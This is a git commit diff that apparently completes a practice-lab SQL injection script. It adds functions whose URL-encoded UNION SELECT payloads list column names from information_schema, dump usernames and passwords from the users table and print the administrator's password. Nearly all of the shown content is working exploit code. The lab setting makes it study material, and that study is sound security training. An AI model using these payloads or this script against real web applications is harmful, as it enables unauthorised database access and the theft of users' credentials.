6a0d6669383804e44fb6459f45f790b7acdabac7
sapi3n-s3c <tyler.ceja5@gmail.com>
2021-07-16 20:51:57 -0400

    finishes script

--- sqli/LAB-09/sqli-lab-09.py
+++ sqli/LAB-09/sqli-lab-09.py
@@ -4,6 +4,7 @@ This script will perform steps 4-6 in notes.txt
     -Output column names from the selected table
     -Output usernames and password from column
 '''
+from enum import Flag
 import requests 
 import sys
 import urllib3
@@ -39,8 +40,27 @@ def sqli_users_table(url):
         return False
 
 
+#=========================================
+#Find username and password column names
+#=========================================
+def sqli_users_columns(url, users_table):
+    sqli_payload = f'%27%20UNION%20SELECT%20column_name,%20null%20FROM%20information_schema.columns%20WHERE%20table_name%20=%20%27{users_table}%27--'
+    res = perform_request(url, sqli_payload)
+    soup = BeautifulSoup(res, 'html.parser')
+    username_column = soup.find(text=re.compile('.*username.*'))
+    password_column = soup.find(text=re.compile('.*password.*'))
+    return username_column, password_column
 
 
+#=========================================
+#Output usernames and passwords from columns
+#=========================================
+def extract_creds(url, username_column, password_column, users_table):
+    sqli_payload = f'%27%20UNION%20SELECT%20{username_column},%20{password_column}%20from%20{users_table}--'
+    res = perform_request(url, sqli_payload)
+    soup = BeautifulSoup(res, 'html.parser')
+    admin_password = soup.body.find(text='administrator').parent.findNext('td').contents[0]
+    return admin_password
 
 
 if __name__== '__main__':
@@ -56,5 +76,16 @@ if __name__== '__main__':
     users_table = sqli_users_table(url)
     if users_table:
         print( f'Found the users table name: {users_table}')
+        username_column, password_column = sqli_users_columns(url, users_table)
+        if username_column and password_column:
+            print(f'Found the username column name: {username_column}')
+            print(f'Found the password column name: {password_column}')
+            admin_creds = extract_creds(url, username_column, password_column, users_table)
+            if admin_creds:
+                print(f'[+] The administrator password is {admin_creds}')
+            else:
+                print('[-]Did not find administrator credentials')
+        else:
+            print('Did not find the username or password columns')
     else:
         print('Did not find users table :(')
